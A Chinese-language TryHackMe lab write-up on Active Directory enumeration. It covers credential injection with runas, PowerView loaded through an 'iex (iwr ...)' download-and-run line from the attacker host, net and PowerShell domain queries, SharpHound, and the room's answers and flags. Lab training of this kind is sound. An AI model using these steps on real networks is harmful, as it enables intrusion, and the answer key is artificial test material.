# kali配置DNS

配置DNS文件
```
vim /etc/resolv.conf 
```

上面配置文件填入以下内容
```
nameserver 10.200.8.101     #THMDC的ip
nameserver 114.114.114.114   #真实的DNS地址，以保证kali还能连接网络
```

重启网络
```
systemctl restart systemd-resolved
```

验证
```
┌──(root💀kali)-[/etc/NetworkManager]
└─# nslookup thmdc.za.tryhackme.com
Server:         10.200.32.101
Address:        10.200.32.101#53

Name:   thmdc.za.tryhackme.com
Address: 10.200.32.101

```

# 获取ssh登录账号

打开：http://distributor.za.tryhackme.com/creds

```
Your credentials have been generated: Username: andrea.mitchell Password: Password1
```

ssh登录
```
ssh za.tryhackme.com\\andrea.mitchell@thmjmp1.za.tryhackme.com
```

rdp
```
xfreerdp /u:'za\andrea.mitchell' /p:'Password1' /v:10.200.8.248 +clipboard

rdesktop  -u 'andrea.mitchell' -p 'Password1' 10.200.8.248
```


# Task 2  Credential Injection


## 主机名与IP

使用主机名，走的是Kerberos验证（容易被蓝队感知）
```
dir \\za.tryhackme.com\SYSVOL
```

使用IP，强制走NTML验证
```
dir \\<DC IP>\SYSVOL
```

> What native Windows binary allows us to inject credentials legitimately into memory?

> runas.exe

> What parameter option of the runas binary will ensure that the injected credentials are used for all network connections?

> /netonly

> What network folder on a domain controller is accessible by any authenticated AD account and stores GPO information?

> SYSVOL

> When performing dir \\za.tryhackme.com\SYSVOL, what type of authentication is performed by default?

> Kerberos Authentication

# Task 3  Enumeration through Microsoft Management Console

thm的rdp环境非常卡，这一节我用PowerView做

远程加载PowerView
```
iex (iwr http://10.50.6.131/PowerView.ps1 -UseBasicParsing)
```

枚举所有OU
```
PS C:\Users\andrea.mitchell> iex (iwr http://10.50.6.131/PowerView.ps1 -UseBasicParsing)
PS C:\Users\andrea.mitchell> Get-NetOU
LDAP://OU=Domain Controllers,DC=za,DC=tryhackme,DC=com
LDAP://OU=People,DC=za,DC=tryhackme,DC=com
LDAP://OU=Groups,DC=za,DC=tryhackme,DC=com
LDAP://OU=Servers,DC=za,DC=tryhackme,DC=com
LDAP://OU=Unix,OU=Servers,DC=za,DC=tryhackme,DC=com
LDAP://OU=Workstations,DC=za,DC=tryhackme,DC=com
LDAP://OU=Consulting,OU=People,DC=za,DC=tryhackme,DC=com
LDAP://OU=Sales,OU=People,DC=za,DC=tryhackme,DC=com
LDAP://OU=Engineering,OU=People,DC=za,DC=tryhackme,DC=com
LDAP://OU=IT,OU=People,DC=za,DC=tryhackme,DC=com
LDAP://OU=Marketing,OU=People,DC=za,DC=tryhackme,DC=com
LDAP://OU=Human Resources,OU=People,DC=za,DC=tryhackme,DC=com
LDAP://OU=Finance,OU=People,DC=za,DC=tryhackme,DC=com
LDAP://OU=Admins,DC=za,DC=tryhackme,DC=com
LDAP://OU=Contoso,DC=za,DC=tryhackme,DC=com
LDAP://OU=ZA,DC=za,DC=tryhackme,DC=com
LDAP://OU=Accounts,OU=ZA,DC=za,DC=tryhackme,DC=com
LDAP://OU=Computers,OU=ZA,DC=za,DC=tryhackme,DC=com
LDAP://OU=Groups,OU=ZA,DC=za,DC=tryhackme,DC=com
LDAP://OU=Admins,OU=Accounts,OU=ZA,DC=za,DC=tryhackme,DC=com
LDAP://OU=Service Accounts,OU=Accounts,OU=ZA,DC=za,DC=tryhackme,DC=com
LDAP://OU=Users,OU=Accounts,OU=ZA,DC=za,DC=tryhackme,DC=com
LDAP://OU=Servers,OU=Computers,OU=ZA,DC=za,DC=tryhackme,DC=com
LDAP://OU=Workstations,OU=Computers,OU=ZA,DC=za,DC=tryhackme,DC=com
LDAP://OU=Security Groups,OU=Groups,OU=ZA,DC=za,DC=tryhackme,DC=com
LDAP://OU=T0,OU=Admins,DC=za,DC=tryhackme,DC=com
LDAP://OU=T1,OU=Admins,DC=za,DC=tryhackme,DC=com
LDAP://OU=T2,OU=Admins,DC=za,DC=tryhackme,DC=com

```

获取用户```t0_tinus.green```的信息
```
PS C:\Users\andrea.mitchell> Get-NetUser –Username t0_tinus.green


logoncount            : 0
badpasswordtime       : 1/1/1601 12:00:00 AM
description           : THM{Enumerating.Via.MMC}
distinguishedname     : CN=t0_tinus.green,OU=T0,OU=Admins,DC=za,DC=tryhackme,DC=com
objectclass           : {top, person, organizationalPerson, user}
displayname           : T0 Tinus Green
userprincipalname     : t0_tinus.green@za.tryhackme.com
name                  : t0_tinus.green
primarygroupid        : 513
objectsid             : S-1-5-21-3330634377-1326264276-632209373-4105
samaccountname        : t0_tinus.green
lastlogon             : 1/1/1601 12:00:00 AM
codepage              : 0
samaccounttype        : 805306368
whenchanged           : 3/21/2022 8:17:47 AM
accountexpires        : 9223372036854775807
cn                    : t0_tinus.green
adspath               : LDAP://CN=t0_tinus.green,OU=T0,OU=Admins,DC=za,DC=tryhackme,DC=com
givenname             : Tinus
instancetype          : 4
objectguid            : abcee909-e31a-4a62-bdd7-e28c8acd6c20
sn                    : Green
lastlogoff            : 1/1/1601 12:00:00 AM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=za,DC=tryhackme,DC=com
dscorepropagationdata : {3/16/2022 6:55:58 PM, 1/1/1601 12:00:00 AM}
initials              : T
admincount            : 1
memberof              : CN=Tier 0 Admins,OU=Groups,DC=za,DC=tryhackme,DC=com
whencreated           : 3/16/2022 6:12:53 PM
badpwdcount           : 0
useraccountcontrol    : 66048
usncreated            : 77933
countrycode           : 0
pwdlastset            : 3/16/2022 6:12:53 PM
usnchanged            : 80310

```

> How many Computer objects are part of the Servers OU?

> 2

> How many Computer objects are part of the Workstations OU?

> 1

> How many departments (Organisational Units) does this organisation consist of?

> 7

> How many Admin tiers does this organisation have?

> 3

> What is the value of the flag stored in the description attribute of the t0_tinus.green account?

> THM{Enumerating.Via.MMC}

# Task 4  Enumeration through Command Prompt

使用```net```命令枚举域信息

获取域用户
```
net user /domain
```

获取指定域用户信息
```
net user zoe.marshall /domain
```

获取域组信息
```
net group /domain
```

获取指定域组信息
```
net group "Tier 1 Admins" /domain
```

获取用户密码政策相关信息
```
net accounts /domain
```


获取aaron.harris的详细信息
```
PS C:\Users\andrea.mitchell> net user aaron.harris /domain
The request will be processed at a domain controller for domain za.tryhackme.com.

User name                    aaron.harris
Full Name                    Aaron Harris
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/24/2022 11:05:11 PM
Password expires             Never
Password changeable          2/24/2022 11:05:11 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Internet Access
The command completed successfully.

```

获取guest账号信息
```
PS C:\Users\andrea.mitchell> net user Guest  /domain
The request will be processed at a domain controller for domain za.tryhackme.com.

User name                    Guest
Full Name
Comment                      Built-in account for guest access to the computer/domain
User's comment
Country/region code          000 (System Default)
Account active               No
Account expires              Never

Password last set            8/8/2022 3:10:41 PM
Password expires             Never
Password changeable          8/8/2022 3:10:41 PM
Password required            No
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Guests
Global Group memberships     *Domain Guests
The command completed successfully.

```


获取"Tier 1 Admins"组信息
```
PS C:\Users\andrea.mitchell> net group "Tier 1 Admins" /domain
The request will be processed at a domain controller for domain za.tryhackme.com.

Group name     Tier 1 Admins
Comment

Members

-------------------------------------------------------------------------------
t1_arthur.tyler          t1_gary.moss             t1_henry.miller
t1_jill.wallis           t1_joel.stephenson       t1_marian.yates
t1_rosie.bryant
The command completed successfully.

```


获取用户策略信息
```
PS C:\Users\andrea.mitchell> net accounts /domain
The request will be processed at a domain controller for domain za.tryhackme.com.

Force user logoff how long after time expires?:       Never
Minimum password age (days):                          0
Maximum password age (days):                          Unlimited
Minimum password length:                              0
Length of password history maintained:                None
Lockout threshold:                                    Never
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        PRIMARY
The command completed successfully.

```

> Apart from the Domain Users group, what other group is the aaron.harris account a member of?

> Internet Access

> Is the Guest account active? (Yay,Nay)

> Nay

> How many accounts are a member of the Tier 1 Admins group?

> 7

> What is the account lockout duration of the current password policy in minutes?

> 30


# Task 5  Enumeration through PowerShell


使用```powershell```命令枚举域信息,这里使用了AD-RSAT 工具


```
PS C:\Users\andrea.mitchell> Get-ADUser -Identity Beth.Nolan -Server za.tryhackme.com -Properties * |select title

title  
-----
Senior

```

> What is the value of the Title attribute of Beth Nolan (beth.nolan)?

> Senior



```
PS C:\Users\andrea.mitchell> Get-ADUser -Identity annette.manning -Server za.tryhackme.com -Properties * |select DistinguishedName
 

DistinguishedName                                                   
-----------------
CN=annette.manning,OU=Marketing,OU=People,DC=za,DC=tryhackme,DC=com

```

> What is the value of the DistinguishedName attribute of Annette Manning (annette.manning)?

> CN=annette.manning,OU=Marketing,OU=People,DC=za,DC=tryhackme,DC=com

```
PS C:\Users\andrea.mitchell> Get-ADGroup -Identity 'Tier 2 Admins' -Server za.tryhackme.com -Properties * |select whenCreated     

whenCreated
-----------
2/24/2022 10:04:41 PM

```

> When was the Tier 2 Admins group created?

> 2/24/2022 10:04:41 PM


```
PS C:\Users\andrea.mitchell> Get-ADGroup -Identity 'Enterprise Admins' -Server za.tryhackme.com  |select sid

sid                                          
---
S-1-5-21-3330634377-1326264276-632209373-519
```

> What is the value of the SID attribute of the Enterprise Admins group?

> S-1-5-21-3330634377-1326264276-632209373-519


```
PS C:\Users\andrea.mitchell> Get-ADDomain -Server za.tryhackme.com |select DeletedObjectsContainer

DeletedObjectsContainer                      
-----------------------
CN=Deleted Objects,DC=za,DC=tryhackme,DC=com

```

> Which container is used to store deleted AD objects?

> CN=Deleted Objects,DC=za,DC=tryhackme,DC=com



# Task 6  Enumeration through Bloodhound

> What command can be used to execute Sharphound.exe and request that it recovers Session information only from the za.tryhackme.com domain without touching domain controllers?

> Sharphound.exe --CollectionMethods Session --Domain za.tryhackme.com --ExcludeDCs

> Apart from the krbtgt account, how many other accounts are potentially kerberoastable?

> 4

> How many machines do members of the Tier 1 Admins group have administrative access to?

> 2

> How many users are members of the Tier 2 Admins group?

> 15















